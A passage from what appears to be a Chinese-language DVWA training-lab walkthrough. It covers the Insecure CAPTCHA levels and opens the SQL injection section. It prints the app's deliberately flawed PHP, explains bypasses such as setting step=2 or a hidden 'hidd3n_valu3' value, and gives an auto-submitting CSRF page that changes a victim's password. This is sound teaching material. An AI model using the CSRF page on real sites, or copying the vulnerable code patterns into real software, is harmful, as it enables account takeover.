class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
<p>我们通过截包改包，把step的值改为2，那么就直接绕过了验证码的步骤，进入修改密码的步骤</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210227112202058.png" alt="image-20210227112202058"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210227112234158.png" alt="image-20210227112234158"></p>
<p>由于没有防止CSRF的措施，我们可以轻松构造攻击页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>      </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.getElementById(&#x27;transfer&#x27;).submit()&quot;</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;transfer&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.153.130/dvwa/vulnerabilities/captcha/&quot;</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;step&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> &gt;</span>     </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。</p>
<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>medium难度下，在第一步验证验证码是否正确的时候加多了一个参数<strong>passed_captcha</strong>，当验证成功的时候就把该值置为true，而在第二部修改密码的时候会检查<strong>passed_captcha</strong>的值是否存在，存在就进行修改，否则就退出。</p>
<p>既然它多了一个参数，那我我们在截包改包的时候把这个参数加上即可。同样地，这个也能进行CSRF攻击，只需在表单中加上<code>&lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt; </code>即可。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210227113052253.png" alt="image-20210227113052253"></p>
<h3 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="variable">$resp</span> || </span><br><span class="line">        (</span><br><span class="line">            <span class="variable">$_POST</span>[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">            &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &#123;</span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Ops. Password mismatch</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>high难度下密码的修改不再分2步了，直接在验证码验证成功之后就进行密码的修改，同时加入了token来防止CSRF攻击，但是验证码的验证部分与之前的有点不一样，验证成功的方式多了一个，就是<strong>g-recaptcha-response</strong>参数的值为<code>hidd3n_valu3</code>而且<strong>HTTP_USER_AGENT</strong>的值是<code>reCAPTCHA</code>的时候也算验证成功，这不就明摆着让攻击者有可乘之机嘛，同样进行截包改包。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210227115157759.png" alt="image-20210227115157759"></p>
<p>然后我想起了是否能够通过用JS发起CSRF请求来修改密码，但是由于user-agent的值只有在老版本的IE浏览器中才能被修改，于是无法被伪造，这个方法行不通。</p>
<h3 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_new</span>  = stripslashes( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_new</span>  = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_new</span>  = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = stripslashes( <span class="variable">$pass_conf</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_conf</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_conf</span> = md5( <span class="variable">$pass_conf</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> );</span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR );</span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>impossible难度首先加入token并且需要输入当前的密码进行身份确认，以此防止CSRF攻击，同时还使用了数据库查询语句预编译来防止SQL注入，然后就是在high级别的基础上去掉了容易被绕过的验证条件，做到了万无一失。</p>
<h2 id="SQL-Injection-SQL注入"><a href="#SQL-Injection-SQL注入" class="headerlink" title="SQL Injection SQL注入"></a>SQL Injection SQL注入</h2><p>这张图是数据库的基本结构，<strong>information_schema</strong>包含了所有表、字段、用户等的名称，因此我们要利用<strong>information_schema</strong>库进行查询。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/4866277-47cd056f79a9f17e.png" alt="img"></p>
<h3 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span 